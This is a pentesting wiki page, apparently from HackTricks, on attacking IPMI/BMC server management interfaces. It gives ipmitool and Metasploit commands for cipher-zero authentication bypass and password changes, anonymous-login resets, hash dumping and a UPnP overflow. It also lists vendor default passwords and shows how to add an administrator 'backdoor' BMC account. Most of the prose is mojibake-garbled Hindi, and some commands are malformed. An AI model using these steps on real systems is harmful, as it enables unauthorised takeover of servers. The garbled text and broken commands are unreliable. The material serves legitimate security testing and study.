# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

### **IPMI рдХрд╛ рдЕрд╡рд▓реЛрдХрди**

**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** рдХрдВрдкреНрдпреВрдЯрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рджреВрд░рд╕реНрде рдкреНрд░рдмрдВрдзрди рдФрд░ рдирд┐рдЧрд░рд╛рдиреА рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рдирдХреАрдХреГрдд рджреГрд╖реНрдЯрд┐рдХреЛрдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдпрд╛ рдкрд╛рд╡рд░ рд╕реНрдерд┐рддрд┐ рд╕реЗ рд╕реНрд╡рддрдВрддреНрд░ рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЬрдм рд╡реЗ рдмрдВрдж рдпрд╛ рдЕрд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реИ:

- рдкреНрд░реА-рдУрдПрд╕ рдмреВрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди
- рдкрд╛рд╡рд░-рдСрдл рдкреНрд░рдмрдВрдзрди
- рд╕рд┐рд╕реНрдЯрдо рд╡рд┐рдлрд▓рддрд╛рдУрдВ рд╕реЗ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐

IPMI рддрд╛рдкрдорд╛рди, рд╡реЛрд▓реНрдЯреЗрдЬ, рдлреИрди рд╕реНрдкреАрдб рдФрд░ рдкрд╛рд╡рд░ рд╕рдкреНрд▓рд╛рдИ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ, рд╕рд╛рде рд╣реА рдЗрдиреНрд╡реЗрдВрдЯрд░реА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рд▓реЙрдЧ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ, рдФрд░ SNMP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрд▓рд░реНрдЯ рднреЗрдЬрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдПрдХ рдкрд╛рд╡рд░ рд╕реНрд░реЛрдд рдФрд░ рдПрдХ LAN рдХрдиреЗрдХреНрд╢рди рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВред

1998 рдореЗрдВ Intel рджреНрд╡рд╛рд░рд╛ рдкреЗрд╢ рдХрд┐рдП рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж рд╕реЗ, IPMI рдХреЛ рдХрдИ рд╡рд┐рдХреНрд░реЗрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдорд░реНрдерд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рджреВрд░рд╕реНрде рдкреНрд░рдмрдВрдзрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдВрд╕реНрдХрд░рдг 2.0 рдХреЗ LAN рдкрд░ рд╕реАрд░рд┐рдпрд▓ рдХреЗ рд╕рдорд░реНрдерди рдХреЗ рд╕рд╛рдеред рдореБрдЦреНрдп рдШрдЯрдХ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

- **рдмреЗрд╕рдмреЛрд░реНрдб рдкреНрд░рдмрдВрдзрди рдирд┐рдпрдВрддреНрд░рдХ (BMC):** IPMI рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдореБрдЦреНрдп рдорд╛рдЗрдХреНрд░реЛ-рдХрдВрдЯреНрд░реЛрд▓рд░ред
- **рд╕рдВрдЪрд╛рд░ рдмрд╕реЗрдВ рдФрд░ рдЗрдВрдЯрд░рдлреЗрд╕:** рдЖрдВрддрд░рд┐рдХ рдФрд░ рдмрд╛рд╣рд░реА рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рдореЗрдВ ICMB, IPMB, рдФрд░ рд╕реНрдерд╛рдиреАрдп рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдЗрдВрдЯрд░рдлреЗрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
- **IPMI рдореЗрдореЛрд░реА:** рд▓реЙрдЧ рдФрд░ рдбреЗрдЯрд╛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ**: 623/UDP/TCP (рдпрд╣ рдЖрдорддреМрд░ рдкрд░ UDP рдкрд░ рд╣реЛрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдпрд╣ TCP рдкрд░ рднреА рдЪрд▓ рд╕рдХрддрд╛ рд╣реИ)

## Enumeration

### Discovery
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
рдЖрдк **рд╕рдВрд╕реНрдХрд░рдг** рдХрд╛ **рдкрд╣рдЪрд╛рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI Vulnerabilities

IPMI 2.0 рдХреЗ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ, Dan Farmer рджреНрд╡рд╛рд░рд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЧрдпрд╛, рдЬреЛ **cipher type 0** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдХрдордЬреЛрд░реА рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдХрдордЬреЛрд░реА, рдЬрд┐рд╕реЗ [Dan Farmer's research](http://fish2.com/ipmi/cipherzero.html) рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдХрд┐рд╕реА рднреА рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдпрджрд┐ рдПрдХ рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПред рдпрд╣ рдХрдордЬреЛрд░реА HP, Dell, рдФрд░ Supermicro рдЬреИрд╕реЗ рдирд┐рд░реНрдорд╛рддрд╛рдУрдВ рдХреЗ рд╡рд┐рднрд┐рдиреНрди BMCs рдореЗрдВ рдкрд╛рдИ рдЧрдИ, рдЬреЛ рд╕рднреА IPMI 2.0 рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рдПрдХ рд╡реНрдпрд╛рдкрдХ рд╕рдорд╕реНрдпрд╛ рдХрд╛ рд╕реБрдЭрд╛рд╡ рджреЗрддреА рд╣реИред

### **IPMI Authentication Bypass via Cipher 0**

рдЗрд╕ рджреЛрд╖ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд Metasploit рд╕рд╣рд╛рдпрдХ рд╕реНрдХреИрдирд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
рдЗрд╕ рджреЛрд╖ рдХрд╛ рд╢реЛрд╖рдг `ipmitool` рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдиреАрдЪреЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдФрд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP рдкреНрд░рдорд╛рдгреАрдХрд░рдг рджреВрд░рд╕реНрде рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐**

рдпрд╣ рднреЗрджреНрдпрддрд╛ рдХрд┐рд╕реА рднреА рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд▓рд┐рдП рдирдордХреАрди рд╣реИрд╢ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб (MD5 рдФрд░ SHA1) рдХреА рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, Metasploit рдПрдХ рдореЙрдбреНрдпреВрд▓ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI рдЧреБрдордирд╛рдо рдкреНрд░рдорд╛рдгреАрдХрд░рдг**

рдХрдИ BMCs рдореЗрдВ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди "рдЧреБрдордирд╛рдо" рдкрд╣реБрдБрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд╢реВрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╛рдорд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рд░реАрд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `ipmitool` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI рд╕реНрдкрд╖реНрдЯ-рдкрд╛рда рдкрд╛рд╕рд╡рд░реНрдб**

IPMI 2.0 рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдбрд┐рдЬрд╝рд╛рдЗрди рд╡рд┐рдХрд▓реНрдк рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП BMCs рдХреЗ рднреАрддрд░ рд╕реНрдкрд╖реНрдЯ-рдкрд╛рда рдкрд╛рд╕рд╡рд░реНрдбреЛрдВ рдХреЗ рднрдВрдбрд╛рд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХрд░рддрд╛ рд╣реИред Supermicro рджреНрд╡рд╛рд░рд╛ рдЗрди рдкрд╛рд╕рд╡рд░реНрдбреЛрдВ рдХреЛ `/nv/PSBlock` рдпрд╛ `/nv/PSStore` рдЬреИрд╕реЗ рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЪрд┐рдВрддрд╛рдПрдБ рдЙрдарддреА рд╣реИрдВ:
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP Vulnerability**

Supermicro рдХреЗ IPMI рдлрд░реНрдорд╡реЗрдпрд░ рдореЗрдВ UPnP SSDP рд╢реНрд░реЛрддрд╛ рдХрд╛ рд╕рдорд╛рд╡реЗрд╢, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ UDP рдкреЛрд░реНрдЯ 1900 рдкрд░, рдПрдХ рдЧрдВрднреАрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИред UPnP рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП Intel SDK рд╕рдВрд╕реНрдХрд░рдг 1.3.1 рдореЗрдВ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ, рдЬреИрд╕рд╛ рдХрд┐ [Rapid7 рдХреЗ рдкреНрд░рдХрдЯреАрдХрд░рдг](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play) рдореЗрдВ рд╡рд┐рд╕реНрддреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, BMC рддрдХ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP рдЕрдкрдиреЗ **Integrated Lights Out (iLO)** рдЙрддреНрдкрд╛рдж рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдирд┐рд░реНрдорд╛рдг рдХреЗ рджреМрд░рд╛рди рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдмрдирд╛рддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдерд╛ рдЕрдиреНрдп рдирд┐рд░реНрдорд╛рддрд╛рдУрдВ рдХреЗ рд╡рд┐рдкрд░реАрдд рд╣реИ, рдЬреЛ рдЖрдорддреМрд░ рдкрд░ **рд╕реНрдерд┐рд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рд╡рд┐рднрд┐рдиреНрди рдЙрддреНрдкрд╛рджреЛрдВ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:

- **HP Integrated Lights Out (iLO)** рдПрдХ **рдлреИрдХреНрдЯрд░реА рдпрд╛рджреГрдЪреНрдЫрд┐рдХ 8-рдЪрд░рд┐рддреНрд░ рд╕реНрдЯреНрд░рд┐рдВрдЧ** рдХреЛ рдЕрдкрдиреЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЙрдЪреНрдЪ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред
- **Dell's iDRAC, IBM's IMM**, рдФрд░ **Fujitsu's Integrated Remote Management Controller** рдЬреИрд╕реЗ рдЙрддреНрдкрд╛рдж рдЖрд╕рд╛рдиреА рд╕реЗ рдЕрдиреБрдорд╛рдирд┐рдд рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреИрд╕реЗ "calvin", "PASSW0RD" (рд╢реВрдиреНрдп рдХреЗ рд╕рд╛рде), рдФрд░ "admin" рдХреНрд░рдорд╢рдГред
- рдЗрд╕реА рддрд░рд╣, **Supermicro IPMI (2.0), Oracle/Sun ILOM**, рдФрд░ **ASUS iKVM BMC** рднреА рд╕рд░рд▓ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рдирдореЗрдВ "ADMIN", "changeme", рдФрд░ "admin" рдЙрдирдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддреЗ рд╣реИрдВред

## Accessing the Host via BMC

Baseboard Management Controller (BMC) рддрдХ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдкрд╣реБрдВрдЪ рд╣реЛрд╕реНрдЯ рдХреЗ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдорд╛рд░реНрдЧ рдЦреЛрд▓рддреА рд╣реИред рдПрдХ рд╕реАрдзрд╛ рджреГрд╖реНрдЯрд┐рдХреЛрдг BMC рдХреЗ рдХреАрдмреЛрд░реНрдб, рд╡реАрдбрд┐рдпреЛ, рдорд╛рдЙрд╕ (KVM) рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдирд╛ рд╣реИред рдпрд╣ рдпрд╛ рддреЛ GRUB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░реВрдЯ рд╢реЗрд▓ рдкрд░ рд╣реЛрд╕реНрдЯ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдХреЗ (`init=/bin/sh`) рдпрд╛ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ CD-ROM рд╕реЗ рдмреВрдЯ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдПрдХ рдмрдЪрд╛рд╡ рдбрд┐рд╕реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдРрд╕реЗ рддрд░реАрдХреЗ рд╣реЛрд╕реНрдЯ рдХреЗ рдбрд┐рд╕реНрдХ рдореЗрдВ рд╕реАрдзреЗ рд╣реЗрд░рдлреЗрд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдмреИрдХрдбреЛрд░ рдбрд╛рд▓рдирд╛, рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛, рдпрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдХреЛрдИ рднреА рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╢рд╛рдорд┐рд▓ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЗрд╕рдХреЗ рд▓рд┐рдП рд╣реЛрд╕реНрдЯ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдЬреЛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрдореА рд╣реИред рдмрд┐рдирд╛ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдП, рдЪрд▓ рд░рд╣реЗ рд╣реЛрд╕реНрдЯ рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИ рдФрд░ рд╣реЛрд╕реНрдЯ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде рднрд┐рдиреНрди рд╣реЛрддрд╛ рд╣реИред рдпрджрд┐ рд╣реЛрд╕реНрдЯ рдХрд╛ рднреМрддрд┐рдХ рдпрд╛ рдЕрдиреБрдХреНрд░рдорд┐рдХ рдХрдВрд╕реЛрд▓ рд▓реЙрдЧ рдЗрди рд░рд╣рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ BMC рдХреЗ KVM рдпрд╛ рд╕реАрд░рд┐рдпрд▓-рдУрд╡рд░-LAN (sol) рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `ipmitool` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╕рд╛рдЭрд╛ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рд╕рдВрд╕рд╛рдзрдиреЛрдВ, рдЬреИрд╕реЗ i2c рдмрд╕ рдФрд░ рд╕реБрдкрд░ I/O рдЪрд┐рдк рдХреЗ рд╢реЛрд╖рдг рдХреА рдЦреЛрдЬ рдПрдХ рдРрд╕рд╛ рдХреНрд╖реЗрддреНрд░ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдЧреЗ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

## Introducing Backdoors into BMC from the Host

BMC рд╕реЗ рд▓реИрд╕ рдПрдХ рд╣реЛрд╕реНрдЯ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдкрд░, **рд╕реНрдерд╛рдиреАрдп BMC рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдмреИрдХрдбреЛрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдбрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**, рдЬреЛ рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХ рд╕реНрдерд╛рдпреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдмрдирд╛рддрд╛ рд╣реИред рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП **`ipmitool`** рдХрд╛ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рд╣реЛрд╕реНрдЯ рдкрд░ рд╣реЛрдирд╛ рдФрд░ BMC рдбреНрд░рд╛рдЗрд╡рд░ рд╕рдорд░реНрдерди рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рджрд░реНрд╢рд╛рддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рд╣реЛрд╕реНрдЯ рдХреЗ рд╕реНрдерд╛рдиреАрдп рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ BMC рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рд▓рд┐рдирдХреНрд╕, рд╡рд┐рдВрдбреЛрдЬ, BSD, рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ DOS рд╕рд╣рд┐рдд рд╡рд┐рднрд┐рдиреНрди рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИред
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

